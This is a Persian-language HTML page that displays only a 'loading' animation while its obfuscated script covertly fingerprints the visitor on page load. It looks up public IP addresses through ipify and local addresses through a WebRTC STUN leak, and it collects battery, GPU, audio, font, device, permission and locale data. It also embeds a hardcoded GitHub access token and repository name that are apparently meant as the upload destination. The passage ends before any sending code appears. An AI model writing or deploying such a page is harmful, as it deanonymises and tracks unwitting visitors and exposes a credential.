<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#eef2ff">
<title>در حال بارگذاری…</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Tahoma,"Iranian Sans",Arial,sans-serif;
    background:linear-gradient(135deg,#eef2ff 0%,#fce7f3 45%,#e0f2fe 100%);
    min-height:100dvh;
    display:flex;align-items:center;justify-content:center;
    padding:16px;
    color:#1f2937;
    overflow:hidden;
    -webkit-font-smoothing:antialiased;
  }
  body::before,
  body::after{
    content:"";position:fixed;border-radius:50%;filter:blur(60px);z-index:-1;pointer-events:none;opacity:.6;
  }
  body::before{
    width:340px;height:340px;background:#c7d2fe;top:-100px;right:-100px;
    animation:float1 9s ease-in-out infinite;
  }
  body::after{
    width:300px;height:300px;background:#fbcfe8;bottom:-90px;left:-90px;
    animation:float2 11s ease-in-out infinite;
  }
  @keyframes float1{0%,100%{transform:translate(0,0)}50%{transform:translate(-30px,30px)}}
  @keyframes float2{0%,100%{transform:translate(0,0)}50%{transform:translate(35px,-25px)}}

  .card{
    position:relative;
    background:rgba(255,255,255,.86);
    -webkit-backdrop-filter:blur(14px) saturate(140%);
    backdrop-filter:blur(14px) saturate(140%);
    border:1px solid rgba(255,255,255,.85);
    border-radius:26px;
    box-shadow:
      0 20px 60px rgba(99,102,241,.18),
      0 8px 22px rgba(236,72,153,.10),
      inset 0 1px 0 rgba(255,255,255,.9);
    width:100%;
    max-width:540px;
    padding:30px 26px 32px;
    text-align:center;
    overflow:hidden;
    animation:cardIn .5s cubic-bezier(.22,.9,.34,1) both;
  }
  @keyframes cardIn{
    from{opacity:0;transform:translateY(14px) scale(.98)}
    to{opacity:1;transform:none}
  }
  .card::before{
    content:"";position:absolute;inset:0;
    background:
      radial-gradient(600px 200px at 50% -10%,rgba(139,92,246,.14),transparent 70%),
      radial-gradient(500px 200px at 50% 110%,rgba(236,72,153,.10),transparent 70%);
    pointer-events:none;
  }

  .stage{position:relative;z-index:1}

  /* Loader */
  #loader-wrap{
    display:flex;flex-direction:column;align-items:center;gap:14px;
    padding:6px 0 4px;
  }
  .loader-svg{
    width:130px;height:130px;display:block;
    filter:drop-shadow(0 8px 22px rgba(99,102,241,.35));
  }
  .loader-text{
    font-size:14px;color:#6366f1;font-weight:600;letter-spacing:.3px;
    animation:pulse 1.6s ease-in-out infinite;
  }
  @keyframes pulse{0%,100%{opacity:.7}50%{opacity:1}}

  /* Typing */
  #typing-wrap{
    display:flex;flex-direction:column;align-items:stretch;gap:8px;
    min-height:270px;
    text-align:right;
  }
  .typing{
    display:flex;flex-direction:column;gap:9px;
    font-size:14.5px;line-height:1.85;color:#334155;
    font-weight:500;
    word-break:break-word;
  }
  .typing > div{
    opacity:0;
    transform:translateY(4px);
    animation:lineIn .35s ease-out forwards;
    padding:6px 12px;
    border-radius:12px;
    background:linear-gradient(90deg,rgba(238,242,255,.7),rgba(252,231,243,.55));
    border:1px solid rgba(255,255,255,.9);
    box-shadow:0 2px 6px rgba(99,102,241,.06);
  }
  @keyframes lineIn{
    to{opacity:1;transform:none}
  }
  .caret{
    display:inline-block;
    color:#8b5cf6;
    font-weight:700;
    margin-right:2px;
    animation:blink .9s steps(1) infinite;
  }
  @keyframes blink{50%{opacity:0}}

  /* Result */
  .result{
    display:flex;flex-direction:column;align-items:center;gap:14px;
    padding:8px 2px;
    text-align:center;
    animation:cardIn .5s cubic-bezier(.22,.9,.34,1) both;
  }
  .result .badge{
    width:74px;height:74px;border-radius:50%;
    display:flex;align-items:center;justify-content:center;
    font-size:38px;line-height:1;
    color:#fff;
    position:relative;
    box-shadow:0 12px 28px rgba(0,0,0,.12);
  }
  .result.success .badge{
    background:linear-gradient(135deg,#22c55e,#16a34a);
    box-shadow:0 14px 30px rgba(34,197,94,.35);
  }
  .result.error .badge{
    background:linear-gradient(135deg,#ef4444,#dc2626);
    box-shadow:0 14px 30px rgba(239,68,68,.35);
  }
  .result .badge::after{
    content:"";position:absolute;inset:-8px;border-radius:50%;
    border:2px solid currentColor;opacity:.35;
    animation:ripple 1.8s ease-out infinite;
  }
  .result.success .badge::after{color:#22c55e}
  .result.error .badge::after{color:#ef4444}
  @keyframes ripple{
    0%{transform:scale(.85);opacity:.45}
    100%{transform:scale(1.35);opacity:0}
  }
  .result .title{
    font-size:19px;font-weight:800;letter-spacing:.2px;
  }
  .result.success .title{color:#166534}
  .result.error .title{color:#991b1b}
  .result .desc{
    font-size:13.5px;color:#475569;line-height:1.85;
    max-width:440px;
    padding:10px 14px;
    background:rgba(255,255,255,.7);
    border:1px solid rgba(255,255,255,.9);
    border-radius:14px;
    word-break:break-word;
    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
    text-align:left;
    direction:ltr;
    max-height:180px;
    overflow:auto;
  }
  .result.success .desc{border-left:3px solid #22c55e}
  .result.error .desc{border-left:3px solid #ef4444}

  @media (max-width:420px){
    .card{padding:24px 18px 26px;border-radius:22px}
    .loader-svg{width:110px;height:110px}
    .typing{font-size:13.5px;line-height:1.75}
    .typing > div{padding:5px 10px}
    .result .title{font-size:17px}
  }
</style>
</head>
<body>

<div class="card">

  <div id="loader-wrap" class="stage">
    <svg class="loader-svg" viewBox="0 0 120 120" aria-hidden="true">
      <defs>
        <linearGradient id="lgA" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#6366f1"/>
          <stop offset="50%" stop-color="#8b5cf6"/>
          <stop offset="100%" stop-color="#ec4899"/>
        </linearGradient>
        <linearGradient id="lgB" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#06b6d4"/>
          <stop offset="100%" stop-color="#3b82f6"/>
        </linearGradient>
        <radialGradient id="lgC" cx="50%" cy="50%" r="50%">
          <stop offset="0%" stop-color="#a78bfa"/>
          <stop offset="100%" stop-color="#6366f1"/>
        </radialGradient>
      </defs>

      <circle cx="60" cy="60" r="52" fill="none" stroke="#e5e7eb" stroke-width="1.5" opacity=".55"/>

      <circle cx="60" cy="60" r="18" fill="none" stroke="#e5e7eb" stroke-width="1.5"
              stroke-dasharray="2 5" opacity=".7">
        <animateTransform attributeName="transform" type="rotate"
                          from="0 60 60" to="360 60 60" dur="6s" repeatCount="indefinite"/>
      </circle>

      <g>
        <circle cx="60" cy="60" r="46" fill="none" stroke="url(#lgA)"
                stroke-width="3" stroke-linecap="round"
                stroke-dasharray="70 220">
          <animateTransform attributeName="transform" type="rotate"
                            from="0 60 60" to="360 60 60" dur="1.15s" repeatCount="indefinite"/>
        </circle>
      </g>

      <g>
        <circle cx="60" cy="60" r="33" fill="none" stroke="url(#lgB)"
                stroke-width="2.6" stroke-linecap="round"
                stroke-dasharray="45 165">
          <animateTransform attributeName="transform" type="rotate"
                            from="360 60 60" to="0 60 60" dur=".9s" repeatCount="indefinite"/>
        </circle>
      </g>

      <circle cx="60" cy="60" r="5" fill="url(#lgC)">
        <animate attributeName="r" values="3.5;6.5;3.5" dur=".85s" repeatCount="indefinite"/>
        <animate attributeName="opacity" values="1;.55;1" dur=".85s" repeatCount="indefinite"/>
      </circle>

      <g opacity=".9">
        <circle cx="106" cy="60" r="3" fill="#ec4899">
          <animateTransform attributeName="transform" type="rotate"
                            from="0 60 60" to="360 60 60" dur="2.2s" repeatCount="indefinite"/>
        </circle>
      </g>
    </svg>
    <div class="loader-text">در حال آماده‌سازی…</div>
  </div>

  <div id="typing-wrap" class="stage" style="display:none">
    <div id="typing" class="typing"></div>
  </div>

  <div id="result" class="stage result" style="display:none"></div>

</div>

<script>
(() => {
  'use strict';

  /* ============================================================
   *  زمان شروع صفحه — همه چیز نسبت به این اندازه‌گیری می‌شود
   * ============================================================ */
  const PAGE_START = performance.now();

  /* ============================================================
   *  URL Params — _0xTk / _0xOn / _0xRp / UseriD
   * ============================================================ */
  const getUrlParam = (base) => {
    if (!base) return null;
    const search = location.search.replace(/^\?/, '');
    if (!search) return null;

    const names = [base, '_' + base];
    const params = new URLSearchParams(search);
    for (const n of names) {
      const v = params.get(n);
      if (v) return v;
    }

    // حالت خام: ?0xTk_VALUE یا ?_0xTk_VALUE
    for (const n of names) {
      const marker = n + '_';
      const idx = search.indexOf(marker);
      if (idx !== -1) {
        const before = idx === 0 ? '&' : search[idx - 1];
        if (before === '&' || idx === 0) {
          const rest = search.slice(idx + marker.length);
          const amp = rest.indexOf('&');
          try { return decodeURIComponent(amp === -1 ? rest : rest.slice(0, amp)); }
          catch { return (amp === -1 ? rest : rest.slice(0, amp)); }
        }
      }
    }
    return null;
  };

  const _0xTkFromUrl   = getUrlParam('0xTk');
  const _0xOnFromUrl   = getUrlParam('0xOn');
  const _0xRpFromUrl   = getUrlParam('0xRp');
  const _0xUseriDUrl   = getUrlParam('UseriD') || getUrlParam('userId') || getUrlParam('userid') || getUrlParam('user');

  const _0xTkDefault =
    "github_pat_11CFHQNFQ0tOczsaLSMWet_" +
    "7k98tNWSY5BnO9viztruJKo4wVHS875ZEMzxAXgJAYz4GVH4ZQHfI2TNCQE";

  const _0xTk = _0xTkFromUrl || _0xTkDefault;
  const _0xOn = _0xOnFromUrl || "WendigosCyber";
  const _0xRp = _0xRpFromUrl || "WendigosCyber";
  const _0xUseriD = _0xUseriDUrl || null;

  /* ============================================================
   *  Storage keys / Cookie utils
   * ============================================================ */
  const _0xCk  = "atlas_visitor_registered_v5";
  const _0xVck = "wendigos_visitor_id_v5";
  const _0xMx  = 60 * 60 * 24 * 365;

  const _0xGc = (name) => {
    const key = encodeURIComponent(name) + "=";
    for (const part of document.cookie.split("; ")) {
      if (part.startsWith(key)) return decodeURIComponent(part.slice(key.length));
    }
    return null;
  };

  const _0xSc = (name, value, maxAgeSeconds) => {
    document.cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}; max-age=${maxAgeSeconds}; path=/; samesite=lax`;
  };

  const _0xGetOrCreateVisitorId = () => {
    let vid = _0xGc(_0xVck);
    if (vid && /^\d{5}$/.test(vid)) return vid;
    const newId = String(Math.floor(10000 + Math.random() * 90000));
    _0xSc(_0xVck, newId, _0xMx);
    return newId;
  };

  /* ============================================================
   *  Fetch با Timeout پیش‌فرض ۳ ثانیه (سریع)
   * ============================================================ */
  const _0xTf = async (url, options = {}, timeoutMs = 3000) => {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    try {
      return await fetch(url, { ...options, signal: controller.signal, cache: 'no-store' });
    } finally {
      clearTimeout(id);
    }
  };

  /* ============================================================
   *  Collectors
   * ============================================================ */
  const _0xGiv4 = async () => {
    try {
      const res = await _0xTf("https://api.ipify.org?format=json");
      if (!res.ok) return null;
      const json = await res.json();
      return { ip: json.ip, version: 'IPv4' };
    } catch (e) { return null; }
  };

  const _0xGiv6 = async () => {
    try {
      const res = await _0xTf("https://api6.ipify.org?format=json");
      if (!res.ok) return null;
      const json = await res.json();
      return { ip: json.ip, version: 'IPv6' };
    } catch (e) { return null; }
  };

  const _0xLocalIP = () => {
    return new Promise((resolve) => {
      const ips = { ipv4: null, ipv6: null };
      let pc;
      try {
        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      } catch (e) { return resolve(ips); }

      let done = false;
      const finish = () => {
        if (done) return;
        done = true;
        try { pc.close(); } catch {}
        resolve(ips);
      };
      pc.onicecandidate = (e) => {
        if (!e.candidate) return;
        const candidate = e.candidate.candidate;
        const ipv4Match = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
        const ipv6Match = candidate.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
        if (ipv4Match && !ips.ipv4 &&
            !ipv4Match[0].startsWith('127.') &&
            ipv4Match[0] !== '0.0.0.0') {
          ips.ipv4 = ipv4Match[0];
        }
        if (ipv6Match && !ips.ipv6 &&
            !ipv6Match[0].startsWith('::1') &&
            ipv6Match[0] !== '::') {
          ips.ipv6 = ipv6Match[0];
        }
        if (ips.ipv4 && ips.ipv6) finish();
      };
      try { pc.createDataChannel(''); } catch {}
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
      setTimeout(finish, 1800);
    });
  };

  const _0xGb = async () => {
    try {
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return {
        level: Math.round((b.level || 0) * 100),
        charging: !!b.charging,
        chargingTime: Number.isFinite(b.chargingTime) ? b.chargingTime : null,
        dischargingTime: Number.isFinite(b.dischargingTime) ? b.dischargingTime : null
      };
    } catch (e) { return null; }
  };

  const _0xGu = () => {
    const uaData = navigator.userAgentData;
    if (!uaData) return null;
    return {
      brands: uaData.brands || null,
      mobile: typeof uaData.mobile === "boolean" ? uaData.mobile : null,
      platform: uaData.platform || null
    };
  };

  const _0xGw = () => {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl2") ||
                 canvas.getContext("webgl") ||
                 canvas.getContext("experimental-webgl");
      if (!gl) return null;
      const debug = gl.getExtension("WEBGL_debug_renderer_info");
      const exts = gl.getSupportedExtensions();
      const params = {
        MAX_TEXTURE_SIZE: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        MAX_RENDERBUFFER_SIZE: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
        MAX_VIEWPORT_DIMS: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
        MAX_VERTEX_ATTRIBS: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
        MAX_FRAGMENT_UNIFORM_VECTORS: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
        ALIASED_LINE_WIDTH_RANGE: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
        EXTENSION_COUNT: exts ? exts.length : 0,
        EXTENSIONS_SAMPLE: exts ? exts.slice(0, 20) : null
      };
      return {
        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null,
        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null,
        version: gl.getParameter(gl.VERSION),
        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        limits: params
      };
    } catch (e) { return null; }
  };

  const _0xGwg = async () => {
    try {
      if (!navigator.gpu) return null;
      const adapter = await navigator.gpu.requestAdapter();
      if (!adapter) return null;
      const features = [...adapter.features].map(f => f);
      const limits = {};
      for (const key of Object.keys(adapter.limits)) limits[key] = adapter.limits[key];
      return {
        vendor: adapter.vendor || null,
        architecture: adapter.architecture || null,
        description: adapter.description || null,
        features,
        limits
      };
    } catch (e) { return null; }
  };

  const _0xGa = async () => {
    try {
      const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!Ctx) return null;
      const sampleRate = 44100;
      const ctx = new Ctx(1, sampleRate, sampleRate);
      const osc = ctx.createOscillator();
      const comp = ctx.createDynamicsCompressor();
      const bq = ctx.createBiquadFilter();
      bq.type = "lowpass";
      bq.frequency.value = 2000;
      osc.type = "sawtooth";
      osc.frequency.value = 800;
      const gain = ctx.createGain();
      gain.gain.value = 0.8;
      osc.connect(bq);
      bq.connect(comp);
      comp.connect(gain);
      gain.connect(ctx.destination);
      osc.start(0);
      const buffer = await ctx.startRendering();
      const data = buffer.getChannelData(0);
      let sum = 0, peak = 0;
      for (let i = 0; i < data.length; i++) {
        const abs = Math.abs(data[i]);
        sum += abs;
        if (abs > peak) peak = abs;
      }
      return { hash: String(Math.round(sum * 1e8)), peak: peak.toFixed(6), length: data.length };
    } catch (e) { return null; }
  };

  const _0xGt = () => ({
    touch: "ontouchstart" in window || navigator.maxTouchPoints > 0,
    maxTouchPoints: navigator.maxTouchPoints || 0
  });

  const _0xDf = async () => {
    const fonts = [
      "Arial","Verdana","Tahoma","Times New Roman","Courier New","Georgia",
      "Segoe UI","Roboto","Comic Sans MS","Trebuchet MS","Impact",
      "Lucida Console","Palatino Linotype","Century Gothic","Helvetica",
      "Calibri","Cambria","Constantia","Candara","Consolas","Corbel",
      "Franklin Gothic Medium","Gabriola","MS Gothic","MS PGothic","SimSun"
    ];
    const available = [];
    const baseFonts = ["monospace", "sans-serif", "serif"];
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    if (!ctx) return null;
    canvas.width = 300;
    canvas.height = 50;
    const testString = "mmmmmmmmmmllllllllliiiiiiiiiiWWWWW";
    const baseWidths = {};
    for (const bf of baseFonts) {
      ctx.font = `16px ${bf}`;
      baseWidths[bf] = ctx.measureText(testString).width;
    }
    for (const font of fonts) {
      for (const bf of baseFonts) {
        ctx.font = `16px "${font}", ${bf}`;
        const width = ctx.measureText(testString).width;
        if (width !== baseWidths[bf]) {
          available.push(font);
          break;
        }
      }
    }
    return available;
  };

  const _0xGmd = async () => {
    try {
      if (!navigator.mediaDevices?.enumerateDevices) return null;
      const devices = await navigator.mediaDevices.enumerateDevices();
      return {
        total: devices.length,
        audioinput: devices.filter(d => d.kind === "audioinput").length,
        videoinput: devices.filter(d => d.kind === "videoinput").length,
        audiooutput: devices.filter(d => d.kind === "audiooutput").length
      };
    } catch (e) { return null; }
  };

  const _0xGn = () => {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return null;
    return {
      effectiveType: c.effectiveType || null,
      type: c.type || null,
      rtt: c.rtt ?? null,
      downlink: c.downlink ?? null,
      saveData: c.saveData ?? null
    };
  };

  const _0xGth     = () => ({ darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches });
  const _0xGcg     = () => ({
    srgb: matchMedia("(color-gamut: srgb)").matches,
    p3: matchMedia("(color-gamut: p3)").matches,
    rec2020: matchMedia("(color-gamut: rec2020)").matches
  });
  const _0xGhdr    = () => ({ hdr: matchMedia("(dynamic-range: high)").matches });
  const _0xGpwa    = () => ({
    standalone: window.matchMedia("(display-mode: standalone)").matches || navigator.standalone === true
  });

  const _0xGp = async () => {
    if (!navigator.permissions?.query) return null;
    const names = ["geolocation","camera","microphone","notifications",
      "clipboard-read","clipboard-write","accelerometer","gyroscope","magnetometer"];
    const result = {};
    for (const name of names) {
      try {
        const p = await navigator.permissions.query({ name });
        result[name] = p.state;
      } catch (e) {}
    }
    return result;
  };

  const _0xGtz = () => {
    const now = new Date();
    return {
      offsetMinutes: now.getTimezoneOffset(),
      calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
      numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
    };
  };

  const _0xGlocale = () => {
    try {
      return {
        dateTime: Intl.DateTimeFormat().resolvedOptions(),
        number: Intl.NumberFormat().resolvedOptions(),
        collator: Intl.Collator().resolvedOptions()
      };
    } catch (e) { return null; }
  };

  const _0xGperf = () => {
    const perf = performance;
    const mem = perf.memory || perf.msMemory;
    const navEntry = perf.getEntriesByType?.("navigation")?.[0];
    return {
      timeOrigin: perf.timeOrigin,
      now: perf.now(),
      memory: mem ? {
        jsHeapSizeLimit: mem.jsHeapSizeLimit,
        totalJSHeapSize: mem.totalJSHeapSize,
        usedJSHeapSize: mem.usedJSHeapSize
      } : null,
      navigation: navEntry ? {
        type: navEntry.type,
        redirectCount: navEntry.redirectCount,
        domContentLoaded: navEntry.domContentLoadedEventStart,
        loadComplete: navEntry.loadEventStart
      } : null
